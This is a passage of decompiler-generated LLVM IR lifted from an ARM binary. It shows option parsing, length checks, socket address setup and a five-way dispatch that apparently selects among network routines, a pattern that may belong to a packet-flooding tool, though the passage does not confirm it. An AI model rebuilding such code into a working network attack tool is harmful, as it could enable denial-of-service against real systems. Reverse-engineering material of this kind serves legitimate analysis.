  store i32 %v0_8204, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v0_8210 = load i32, i32* @r4, align 4
  store i32 %v0_8210, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_15f5c.21 to i32), i32* %r3.global-to-local, align 4
  %v6_8218 = inttoptr i32 %v0_8204 to i32*
  %v7_8218 = call i32 @function_9f84(i32 %v0_8210, i32* %v6_8218, i32 20, i32 ptrtoint ([4 x i8]* @global_var_15f5c.21 to i32), i32 %v6_8200)
  %v0_821c = load i32, i32* @r5, align 4
  store i32 %v0_821c, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v7_8218, i32* %fp.global-to-local, align 4
  %v0_822c = load i32, i32* @r4, align 4
  store i32 %v0_822c, i32* %r0.global-to-local, align 4
  %v5_8230 = inttoptr i32 %v0_821c to i32*
  %v6_8230 = call i32 @function_9f84(i32 %v0_822c, i32* %v5_8230, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_8234 = load i32, i32* @r5, align 4
  store i32 %v0_8234, i32* %r1.global-to-local, align 4
  store i32 %v6_8230, i32* %sb.global-to-local, align 4
  store i32 22, i32* %r2.global-to-local, align 4
  %v0_8240 = load i32, i32* @r4, align 4
  store i32 %v0_8240, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_15f60.23 to i32), i32* %r3.global-to-local, align 4
  %v5_8248 = inttoptr i32 %v0_8234 to i32*
  %v6_8248 = call i32 @function_9f84(i32 %v0_8240, i32* %v5_8248, i32 22, i32 ptrtoint ([2 x i8]* @global_var_15f60.23 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_824c = load i32, i32* @r5, align 4
  store i32 %v0_824c, i32* %r1.global-to-local, align 4
  store i32 %v6_8248, i32* @sl, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_8258 = load i32, i32* @r4, align 4
  store i32 %v0_8258, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_8260 = inttoptr i32 %v0_824c to i32*
  %v5_8260 = call i32 @function_a4e8(i32 %v0_8258, i32* %v4_8260, i32 24, i32 1)
  %v0_8264 = load i32, i32* @r5, align 4
  store i32 %v0_8264, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_8260, i32* @r6, align 4
  %v0_8274 = load i32, i32* @r4, align 4
  store i32 %v0_8274, i32* %r0.global-to-local, align 4
  %v4_8278 = inttoptr i32 %v0_8264 to i32*
  %v5_8278 = call i32 @function_a4e8(i32 %v0_8274, i32* %v4_8278, i32 7, i32 80)
  %v2_8280 = ptrtoint i32* %stack_var_-20809 to i32
  %v3_8288 = mul i32 %v5_8278, 65536
  store i32 %v3_8288, i32* %r3.global-to-local, align 4
  %tmp199 = bitcast i32* %stack_var_-20809 to i8*
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  store i32 10241, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_829c = urem i32 %v5_8278, 65536
  store i32 %v3_829c, i32* %r8.global-to-local, align 4
  %v3_82a0 = call i32 @function_13cd0(i8* %tmp199, i32 0)
  store i32 %v3_82a0, i32* %r0.global-to-local, align 4
  %v0_82a4 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_82a4 = icmp slt i32 %v0_82a4, 0
  store i1 %v1_82a4, i1* %cpsr_n.global-to-local, align 1
  %v2_82a4 = icmp eq i32 %v0_82a4, 0
  store i1 %v2_82a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_82a4, label %.thread13, label %bb

bb:                                               ; preds = %dec_label_pc_81cc
  %v1_82a8 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_82a8 = icmp slt i32 %v1_82a8, 0
  store i1 %v2_82a8, i1* %cpsr_n.global-to-local, align 1
  %v3_82a8 = icmp eq i32 %v1_82a8, 0
  store i1 %v3_82a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_82a8, label %bb200, label %dec_label_pc_82c4

.thread13:                                        ; preds = %dec_label_pc_81cc
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b8

bb200:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b8

dec_label_pc_82b8:                                ; preds = %bb200, %dec_label_pc_82e4, %.thread13, %dec_label_pc_82d4, %dec_label_pc_82c4
  %v29_82c0 = phi i32 [ %v2_82e8, %dec_label_pc_82e4 ], [ %v3_82a0, %.thread13 ], [ %v3_82a0, %bb200 ], [ %v2_82d8, %dec_label_pc_82d4 ], [ %v2_82c8, %dec_label_pc_82c4 ]
  %v2_82c0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_82c0, i32* %r4.global-to-local, align 4
  store i32 %v6_81cc, i32* %r5.global-to-local, align 4
  store i32 %v9_81cc, i32* %r6.global-to-local, align 4
  store i32 %v15_81cc, i32* %r8.global-to-local, align 4
  ret i32 %v29_82c0

dec_label_pc_82c4:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_82a4, i32* %r0.global-to-local, align 4
  %v1_82c8 = inttoptr i32 %v0_82a4 to i8*
  %v2_82c8 = call i32 @function_12cdc(i8* %v1_82c8)
  store i32 %v2_82c8, i32* %r0.global-to-local, align 4
  %v1_82cc = add i32 %v2_82c8, -255
  %v2_82cc = icmp ugt i32 %v2_82c8, 254
  store i1 %v2_82cc, i1* %cpsr_c.global-to-local, align 1
  %v3_82cc = sub i32 254, %v2_82c8
  %v4_82cc = and i32 %v3_82cc, %v2_82c8
  %v5_82cc = icmp slt i32 %v4_82cc, 0
  store i1 %v5_82cc, i1* %cpsr_v.global-to-local, align 1
  %v6_82cc = icmp slt i32 %v1_82cc, 0
  store i1 %v6_82cc, i1* %cpsr_n.global-to-local, align 1
  %v7_82cc = icmp eq i32 %v2_82c8, 255
  store i1 %v7_82cc, i1* %cpsr_z.global-to-local, align 1
  %v8_82d0 = icmp sgt i32 %v2_82c8, 255
  br i1 %v8_82d0, label %dec_label_pc_82b8, label %dec_label_pc_82d4

dec_label_pc_82d4:                                ; preds = %dec_label_pc_82c4
  %v0_82d4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_82d4, i32* %r0.global-to-local, align 4
  %v1_82d8 = inttoptr i32 %v0_82d4 to i8*
  %v2_82d8 = call i32 @function_12cdc(i8* %v1_82d8)
  store i32 %v2_82d8, i32* %r0.global-to-local, align 4
  %v1_82dc = add i32 %v2_82d8, -127
  %v2_82dc = icmp ugt i32 %v2_82d8, 126
  store i1 %v2_82dc, i1* %cpsr_c.global-to-local, align 1
  %v3_82dc = sub i32 126, %v2_82d8
  %v4_82dc = and i32 %v3_82dc, %v2_82d8
  %v5_82dc = icmp slt i32 %v4_82dc, 0
  store i1 %v5_82dc, i1* %cpsr_v.global-to-local, align 1
  %v6_82dc = icmp slt i32 %v1_82dc, 0
  store i1 %v6_82dc, i1* %cpsr_n.global-to-local, align 1
  %v7_82dc = icmp eq i32 %v2_82d8, 127
  store i1 %v7_82dc, i1* %cpsr_z.global-to-local, align 1
  %v8_82e0 = icmp sgt i32 %v2_82d8, 127
  br i1 %v8_82e0, label %dec_label_pc_82b8, label %dec_label_pc_82e4

dec_label_pc_82e4:                                ; preds = %dec_label_pc_82d4
  %v0_82e4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_82e4, i32* %r0.global-to-local, align 4
  %v1_82e8 = inttoptr i32 %v0_82e4 to i8*
  %v2_82e8 = call i32 @function_12cdc(i8* %v1_82e8)
  store i32 %v2_82e8, i32* %r0.global-to-local, align 4
  %v1_82ec = add i32 %v2_82e8, -9
  %v2_82ec = icmp ugt i32 %v2_82e8, 8
  store i1 %v2_82ec, i1* %cpsr_c.global-to-local, align 1
  %v3_82ec = sub i32 8, %v2_82e8
  %v4_82ec = and i32 %v3_82ec, %v2_82e8
  %v5_82ec = icmp slt i32 %v4_82ec, 0
  store i1 %v5_82ec, i1* %cpsr_v.global-to-local, align 1
  %v6_82ec = icmp slt i32 %v1_82ec, 0
  store i1 %v6_82ec, i1* %cpsr_n.global-to-local, align 1
  %v7_82ec = icmp eq i32 %v2_82e8, 9
  store i1 %v7_82ec, i1* %cpsr_z.global-to-local, align 1
  %v7_82f0 = icmp sgt i32 %v2_82e8, 9
  br i1 %v7_82f0, label %dec_label_pc_82b8, label %bb201

bb201:                                            ; preds = %dec_label_pc_82e4
  %v10_82f0 = ptrtoint i32* %stack_var_-404 to i32
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v8_82f4 = load i32, i32* @r4, align 4
  %v10_82f4 = add i32 %v10_82f0, 364
  %v11_82f4 = inttoptr i32 %v10_82f4 to i32*
  store i32 %v8_82f4, i32* %v11_82f4, align 4
  br label %dec_label_pc_82fc

dec_label_pc_82fc:                                ; preds = %bb201, %bb205
  %v0_82fc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_82fc, i32* %r0.global-to-local, align 4
  %v1_8300 = inttoptr i32 %v0_82fc to i8*
  %v2_8300 = call i32 @function_12cdc(i8* %v1_8300)
  store i32 %v2_8300, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8308 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_8308, i32* %ip.global-to-local, align 4
  %v2_830c = sub i32 %v2_8300, %v3_8308
  %v3_830c = icmp uge i32 %v2_8300, %v3_8308
  store i1 %v3_830c, i1* %cpsr_c.global-to-local, align 1
  %v4_830c = xor i32 %v3_8308, %v2_8300
  %v5_830c = xor i32 %v2_830c, %v2_8300
  %v6_830c = and i32 %v5_830c, %v4_830c
  %v7_830c = icmp slt i32 %v6_830c, 0
  store i1 %v7_830c, i1* %cpsr_v.global-to-local, align 1
  %v8_830c = icmp slt i32 %v2_830c, 0
  store i1 %v8_830c, i1* %cpsr_n.global-to-local, align 1
  %v9_830c = icmp eq i32 %v2_8300, %v3_8308
  store i1 %v9_830c, i1* %cpsr_z.global-to-local, align 1
  %v7_8310 = icmp sgt i32 %v2_8300, %v3_8308
  br i1 %v7_8310, label %dec_label_pc_8314, label %dec_label_pc_8340

dec_label_pc_8314:                                ; preds = %dec_label_pc_82fc
  %v0_8314 = load i32, i32* %fp.global-to-local, align 4
  %v2_8314 = add i32 %v0_8314, %v3_8308
  %v3_8314 = inttoptr i32 %v2_8314 to i8*
  %v4_8314 = load i8, i8* %v3_8314, align 1
  %v6_8314 = zext i8 %v4_8314 to i32
  %v1_8318 = add nsw i32 %v6_8314, -32
  store i32 %v1_8318, i32* %r2.global-to-local, align 4
  %v1_831c = add nsw i32 %v6_8314, -97
  store i32 %v1_831c, i32* %r3.global-to-local, align 4
  %v2_8320 = icmp ugt i32 %v1_831c, 24
  store i1 %v2_8320, i1* %cpsr_c.global-to-local, align 1
  %v3_8320 = sub nsw i32 121, %v6_8314
  %v4_8320 = and i32 %v3_8320, %v1_831c
  %v5_8320 = icmp slt i32 %v4_8320, 0
  store i1 %v5_8320, i1* %cpsr_v.global-to-local, align 1
  %v6_8320 = icmp ult i8 %v4_8314, 122
  store i1 %v6_8320, i1* %cpsr_n.global-to-local, align 1
  %v7_8320 = icmp eq i32 %v1_831c, 25
  store i1 %v7_8320, i1* %cpsr_z.global-to-local, align 1
  %v2_8324 = xor i1 %v2_8320, true
  %v3_8324 = or i1 %v7_8320, %v2_8324
  br i1 %v3_8324, label %bb202, label %bb203

bb202:                                            ; preds = %dec_label_pc_8314
  %v5_8324 = trunc i32 %v1_8318 to i8
  store i8 %v5_8324, i8* %v3_8314, align 1
  %v0_8328.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_8328.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb203

bb203:                                            ; preds = %dec_label_pc_8314, %bb202
  %v1_832c = phi i1 [ %v2_8320, %dec_label_pc_8314 ], [ %v1_8328.pre, %bb202 ]
  %v0_832c = phi i1 [ false, %dec_label_pc_8314 ], [ %v0_8328.pre, %bb202 ]
  %v2_8328 = xor i1 %v1_832c, true
  %v3_8328 = or i1 %v0_832c, %v2_8328
  br i1 %v3_8328, label %bb204, label %._crit_edge

._crit_edge:                                      ; preds = %bb203
  %v0_8334.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb205

bb204:                                            ; preds = %bb203
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v7_832c = load i32, i32* %v11_82f4, align 4
  store i32 %v7_832c, i32* %ip.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %._crit_edge, %bb204
  %v0_8334 = phi i32 [ %v0_8334.pre, %._crit_edge ], [ %v7_832c, %bb204 ]
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  %v1_8334 = add i32 %v0_8334, 1
  store i32 %v1_8334, i32* %ip.global-to-local, align 4
  store i32 %v1_8334, i32* %stack_var_-40, align 4
  br label %dec_label_pc_82fc

dec_label_pc_8340:                                ; preds = %dec_label_pc_82fc
  store i32 36, i32* %r0.global-to-local, align 4
  %v1_8344 = call i32 @function_123b0(i32 36)
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_834c = call i32 @function_123b0(i32 37)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_8354 = call i32 @function_123b0(i32 38)
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_835c = call i32 @function_123b0(i32 39)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_8364 = call i32 @function_123b0(i32 40)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_836c = call i32 @function_123b0(i32 41)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_8374 = call i32 @function_123b0(i32 42)
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_837c = call i32 @function_123b0(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_8384 = call i32 @function_123b0(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_838c = call i32 @function_123b0(i32 45)
  store i32 %v1_838c, i32* %r0.global-to-local, align 4
  %v0_8390 = load i32, i32* @r6, align 4
  %v2_8390 = add i32 %v0_8390, -256
  %v3_8390 = icmp ugt i32 %v0_8390, 255
  store i1 %v3_8390, i1* %cpsr_c.global-to-local, align 1
  %v4_8390 = sub i32 255, %v0_8390
  %v5_8390 = and i32 %v4_8390, %v0_8390
  %v6_8390 = icmp slt i32 %v5_8390, 0
  store i1 %v6_8390, i1* %cpsr_v.global-to-local, align 1
  %v7_8390 = icmp slt i32 %v2_8390, 0
  store i1 %v7_8390, i1* %cpsr_n.global-to-local, align 1
  %v8_8390 = icmp eq i32 %v0_8390, 256
  store i1 %v8_8390, i1* %cpsr_z.global-to-local, align 1
  %v5_8394 = icmp slt i32 %v0_8390, 256
  br i1 %v5_8394, label %thread-pre-split, label %bb206

bb206:                                            ; preds = %dec_label_pc_8340
  store i32 256, i32* @r6, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_8340, %bb206
  %v0_839c = phi i32 [ 256, %bb206 ], [ %v0_8390, %dec_label_pc_8340 ]
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_83a0 = call i32 @function_123b0(i32 46)
  store i32 %v0_839c, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_83b0 = call i32 @function_14294(i32 %v0_839c, i32 3140)
  store i32 %v2_83b0, i32* %r0.global-to-local, align 4
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_83b8 = icmp slt i32 %v0_839c, 0
  store i1 %v1_83b8, i1* %cpsr_n.global-to-local, align 1
  %v2_83b8 = icmp eq i32 %v0_839c, 0
  store i1 %v2_83b8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_83b0, i32* @r5, align 4
  %tmp207 = icmp slt i32 %v0_839c, 1
  br i1 %tmp207, label %dec_label_pc_84f4, label %dec_label_pc_83c8

dec_label_pc_83c8:                                ; preds = %thread-pre-split
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_83cc

dec_label_pc_83cc:                                ; preds = %dec_label_pc_9e70, %dec_label_pc_83c8
  %v1_83d8 = phi i32 [ %v1_9e8c, %dec_label_pc_9e70 ], [ %v2_83b0, %dec_label_pc_83c8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %v1_81e4, i32* %r1.global-to-local, align 4
  %v2_83d8 = inttoptr i32 %v1_83d8 to i32*
  store i32 -1, i32* %v2_83d8, align 4
  %v0_83dc = load i32, i32* %r3.global-to-local, align 4
  %v1_83dc = trunc i32 %v0_83dc to i8
  %v2_83dc = load i32, i32* @r5, align 4
  %v3_83dc = add i32 %v2_83dc, 4
  %v4_83dc = inttoptr i32 %v3_83dc to i8*
  store i8 %v1_83dc, i8* %v4_83dc, align 1
  %v0_83e0 = load i32, i32* @r7, align 4
  store i32 %v0_83e0, i32* %r0.global-to-local, align 4
  %v2_83e4 = call i32 @function_134c4(i32 %v0_83e0, i32 %v1_81e4)
  store i32 %v2_83e4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v2_83f0 = and i32 %v2_83e4, 536870912
  %v3_83f0 = icmp ne i32 %v2_83f0, 0
  store i1 %v3_83f0, i1* %cpsr_c.global-to-local, align 1
  %v5_83f0 = mul i32 %v2_83e4, 24
  store i32 %v5_83f0, i32* %r3.global-to-local, align 4
  %v2_83f4 = add i32 %v5_83f0, %arg2
  store i32 %v2_83f4, i32* @r6, align 4
  %v1_83f8 = add i32 %v2_83f4, 16
  %v2_83f8 = inttoptr i32 %v1_83f8 to i32*
  %v3_83f8 = load i32, i32* %v2_83f8, align 4
  store i32 %v3_83f8, i32* %r2.global-to-local, align 4
  %v0_83fc = load i32, i32* @r5, align 4
  %v1_83fc = add i32 %v0_83fc, 532
  store i32 %v1_83fc, i32* @lr, align 4
  store i32 %v1_83fc, i32* @r0, align 4
  %v0_8404 = load i32, i32* @sl, align 4
  store i32 %v0_8404, i32* %r1.global-to-local, align 4
  %v2_8408 = add i32 %v0_83fc, 16
  %v3_8408 = inttoptr i32 %v2_8408 to i32*
  store i32 %v3_83f8, i32* %v3_8408, align 4
  %v0_840c = load i32, i32* @lr, align 4
  %v2_8410 = inttoptr i32 %v1_83fc to i8*
  %v3_8410 = call i32 @function_12d04(i8* %v2_8410, i32 %v0_8404)
  store i32 %v3_8410, i32* %r0.global-to-local, align 4
  %v0_8414 = load i32, i32* @r5, align 4
  %v1_8414 = add i32 %v0_8414, 532
  %v2_8414 = inttoptr i32 %v1_8414 to i8*
  %v3_8414 = load i8, i8* %v2_8414, align 1
  %v4_8414 = zext i8 %v3_8414 to i32
  store i32 %v4_8414, i32* %r3.global-to-local, align 4
  %v2_8418 = icmp ugt i8 %v3_8414, 46
  store i1 %v2_8418, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8418 = icmp ult i8 %v3_8414, 47
  store i1 %v6_8418, i1* %cpsr_n.global-to-local, align 1
  %v7_8418 = icmp eq i8 %v3_8414, 47
  store i1 %v7_8418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8418, label %dec_label_pc_8444, label %dec_label_pc_8420

dec_label_pc_8420:                                ; preds = %dec_label_pc_83cc
  store i32 %v0_840c, i32* %r0.global-to-local, align 4
  %v1_8424 = inttoptr i32 %v0_840c to i8*
  %v2_8424 = call i32 @function_12cdc(i8* %v1_8424)
  store i32 %v2_8424, i32* @r2, align 4
  %v0_842c = load i32, i32* @r5, align 4
  %v1_8430 = add i32 %v0_842c, 533
  store i32 %v1_8430, i32* @r0, align 4
  store i32 %v0_840c, i32* @r1, align 4
  %v3_8438 = call i32 @function_13cc0(i32 %v1_8430, i32 %v0_840c, i32 %v2_8424)
  store i32 %v3_8438, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_8440 = load i32, i32* @r5, align 4
  %v3_8440 = add i32 %v2_8440, 532
  %v4_8440 = inttoptr i32 %v3_8440 to i8*
  store i8 47, i8* %v4_8440, align 1
  %v0_8448.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_8444

dec_label_pc_8444:                                ; preds = %dec_label_pc_83cc, %dec_label_pc_8420
  %v0_8448 = phi i32 [ %v0_8414, %dec_label_pc_83cc ], [ %v0_8448.pre, %dec_label_pc_8420 ]
  %v0_8444 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8444, i32* %r1.global-to-local, align 4
  %v1_8448 = add i32 %v0_8448, 1440
  store i32 %v1_8448, i32* @r0, align 4
  %v2_844c = inttoptr i32 %v1_8448 to i8*
  %v3_844c = call i32 @function_12d04(i8* %v2_844c, i32 %v0_8444)
  %v0_8450 = load i32, i32* @r5, align 4
  %v0_8454 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8454, i32* %r1.global-to-local, align 4
  %v1_8458 = add i32 %v0_8450, 1431
  store i32 %v1_8458, i32* @r0, align 4
  %v2_845c = inttoptr i32 %v1_8458 to i8*
  %v3_845c = call i32 @function_12d04(i8* %v2_845c, i32 %v0_8454)
  %v0_8460 = load i32, i32* @r5, align 4
  %v1_8464 = add i32 %v0_8460, 789
  store i32 %v1_8464, i32* @r0, align 4
  %v0_8468 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8468, i32* %r1.global-to-local, align 4
  %v2_846c = inttoptr i32 %v1_8464 to i8*
  %v3_846c = call i32 @function_12d04(i8* %v2_846c, i32 %v0_8468)
  store i32 %v3_846c, i32* %r0.global-to-local, align 4
  %v0_8470 = load i32, i32* @r6, align 4
  %v1_8470 = add i32 %v0_8470, 20
  %v2_8470 = inttoptr i32 %v1_8470 to i8*
  %v3_8470 = load i8, i8* %v2_8470, align 1
  %v4_8470 = zext i8 %v3_8470 to i32
  store i32 %v4_8470, i32* %r3.global-to-local, align 4
  %v2_8474 = icmp ugt i8 %v3_8470, 30
  store i1 %v2_8474, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8474 = icmp ult i8 %v3_8470, 31
  store i1 %v6_8474, i1* %cpsr_n.global-to-local, align 1
  %v7_8474 = icmp eq i8 %v3_8470, 31
  store i1 %v7_8474, i1* %cpsr_z.global-to-local, align 1
  %v2_8478 = xor i1 %v7_8474, true
  %v3_8478 = and i1 %v2_8474, %v2_8478
  br i1 %v3_8478, label %dec_label_pc_84c8, label %dec_label_pc_847c

dec_label_pc_847c:                                ; preds = %dec_label_pc_8444
  %v1_847c = add i32 %v0_8470, 16
  %v2_847c = inttoptr i32 %v1_847c to i32*
  %v3_847c = load i32, i32* %v2_847c, align 4
  store i32 %v3_847c, i32* @r4, align 4
  %v0_8480 = call i32 @function_fe60()
  store i32 %v0_8480, i32* %r0.global-to-local, align 4
  %v0_8484 = load i32, i32* @r4, align 4
  %v1_8488 = and i32 %v0_8484, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_8488, i32* %r3.global-to-local, align 4
  %v1_8484 = udiv i32 %v0_8484, 256
  %v3_848c = and i32 %v1_8484, 65280
  store i32 %v3_848c, i32* %r2.global-to-local, align 4
  %v3_8490 = mul i32 %v0_8484, 16777216
  %v2_8494 = and i32 %v0_8484, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16777216)
  %v3_8494 = icmp ne i32 %v2_8494, 0
  store i1 %v3_8494, i1* %cpsr_c.global-to-local, align 1
  %v4_8494 = mul i32 %v1_8488, 256
  %v5_8494 = or i32 %v4_8494, %v3_8490
  store i32 %v5_8494, i32* %r1.global-to-local, align 4
  %v0_8498 = load i32, i32* @r6, align 4
  %v1_8498 = add i32 %v0_8498, 20
  %v2_8498 = inttoptr i32 %v1_8498 to i8*
  %v3_8498 = load i8, i8* %v2_8498, align 1
  %v4_8498 = zext i8 %v3_8498 to i32
  store i32 %v4_8498, i32* %ip.global-to-local, align 4
  %v4_849c = udiv i32 %v0_8484, 16777216
  %v5_849c = or i32 %v3_848c, %v4_849c
  %v2_84a0 = or i32 %v5_849c, %v5_8494
  %v7_84a4 = lshr i32 %v0_8480, %v4_8498
  %v8_84a4 = add i32 %v7_84a4, %v2_84a0
  store i32 %v8_84a4, i32* %r2.global-to-local, align 4
  %v3_84b0 = mul i32 %v8_84a4, 16777216
  %v1_84b4 = and i32 %v8_84a4, 65280
  store i32 %v1_84b4, i32* %r0.global-to-local, align 4
  %v4_84b8 = mul nuw nsw i32 %v1_84b4, 256
  %v5_84b8 = or i32 %v4_84b8, %v3_84b0
  store i32 %v5_84b8, i32* %r1.global-to-local, align 4
  %v2_84bc = and i32 %v8_84a4, 8388608
  %v3_84bc = icmp ne i32 %v2_84bc, 0
  store i1 %v3_84bc, i1* %cpsr_c.global-to-local, align 1
  %v2_84c0 = call i32 @llvm.bswap.i32(i32 %v8_84a4)
  store i32 %v2_84c0, i32* %r3.global-to-local, align 4
  %v1_84c4 = load i32, i32* @r5, align 4
  %v2_84c4 = add i32 %v1_84c4, 16
  %v3_84c4 = inttoptr i32 %v2_84c4 to i32*
  store i32 %v2_84c0, i32* %v3_84c4, align 4
  br label %dec_label_pc_84c8

dec_label_pc_84c8:                                ; preds = %dec_label_pc_8444, %dec_label_pc_847c
  %v0_84c8 = call i32 @function_fe60()
  store i32 %v0_84c8, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_84d0 = call i32 @function_133f8(i32 %v0_84c8, i32 5)
  store i32 %v2_84d0, i32* %r0.global-to-local, align 4
  %v1_84d4 = add i32 %v2_84d0, -4
  %v3_84d4 = sub i32 3, %v2_84d0
  %v4_84d4 = and i32 %v3_84d4, %v2_84d0
  %v5_84d4 = icmp slt i32 %v4_84d4, 0
  store i1 %v5_84d4, i1* %cpsr_v.global-to-local, align 1
  %v6_84d4 = icmp slt i32 %v1_84d4, 0
  store i1 %v6_84d4, i1* %cpsr_n.global-to-local, align 1
  %v7_84d4 = icmp eq i32 %v2_84d0, 4
  store i1 %v7_84d4, i1* %cpsr_z.global-to-local, align 1
  %v5_84d8 = and i32 %v2_84d0, 1073741824
  %v6_84d8 = icmp ne i32 %v5_84d8, 0
  store i1 %v6_84d8, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v2_84d0, label %dec_label_pc_9e70 [
    i32 0, label %dec_label_pc_9ed4
    i32 1, label %dec_label_pc_9f00
    i32 2, label %dec_label_pc_9f2c
    i32 3, label %dec_label_pc_9f58
    i32 4, label %dec_label_pc_9e48
  ]

dec_label_pc_84f4:                                ; preds = %thread-pre-split
  %v1_84f8 = add i32 %v2_83b0, 1456
  %v0_8500 = load i32, i32* %r8.global-to-local, align 4
  %v1_8500 = urem i32 %v0_8500, 256
  store i32 %v1_8500, i32* %r3.global-to-local, align 4
  %v1_8504 = add i32 %v2_83b0, 1464
  store i32 %v1_8504, i32* %r1.global-to-local, align 4
  %v2_8508 = ptrtoint i32* %stack_var_-10568 to i32
  store i32 %v2_8508, i32* %r2.global-to-local, align 4
  store i32 %v1_84f8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_8528.preheader

dec_label_pc_8528.preheader:                      ; preds = %dec_label_pc_84f4, %dec_label_pc_9e94
  %storemerge148.in.in = phi i32 [ %v0_9ea8, %dec_label_pc_9e94 ], [ %v0_8500, %dec_label_pc_84f4 ]
  %stack_var_-20868.0.ph = phi i32 [ %v1_9ea0, %dec_label_pc_9e94 ], [ %v1_84f8, %dec_label_pc_84f4 ]
  %stack_var_-20860.0.ph = phi i32 [ %v1_9ea8, %dec_label_pc_9e94 ], [ %v1_8500, %dec_label_pc_84f4 ]
  %stack_var_-20872.0.ph = phi i32 [ %v1_9eac, %dec_label_pc_9e94 ], [ %v1_8504, %dec_label_pc_84f4 ]
  %stack_var_-20856.0.ph = phi i32 [ %v2_9eb0, %dec_label_pc_9e94 ], [ %v2_8508, %dec_label_pc_84f4 ]
  %storemerge148.in = and i32 %storemerge148.in.in, 128
  %storemerge148 = icmp ne i32 %storemerge148.in, 0
  store i1 %storemerge148, i1* %cpsr_c.global-to-local, align 1
  %v3_9eb8 = udiv i32 %storemerge148.in.in, 256
  store i32 %v3_9eb8, i32* %r8.global-to-local, align 4
  %v4_8590 = mul nuw nsw i32 %stack_var_-20860.0.ph, 256
  %v2_86d0 = ptrtoint i32* %stack_var_-148 to i32
  %v2_86e8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_8728 = ptrtoint i32* %stack_var_-72 to i32
  %v3_8734 = bitcast i32* %stack_var_-72 to %sockaddr*
  %v2_8748 = ptrtoint i32* %stack_var_-36 to i32
  %v1_8940 = inttoptr i32 %stack_var_-20856.0.ph to i8*
  %v1_8c94 = icmp slt i32 %v6_8200, 0
  %v2_8c94 = icmp eq i32 %v6_8200, 0
  %v4_8ce8 = inttoptr i32 %stack_var_-20856.0.ph to i32*
  %v1_8b90 = inttoptr i32 %v6_8200 to i8*
  %v2_87b4 = ptrtoint i32* %stack_var_-56 to i32
  %v2_87b8 = ptrtoint i32* %stack_var_-200 to i32
  %v2_87bc = ptrtoint i32* %stack_var_-328 to i32
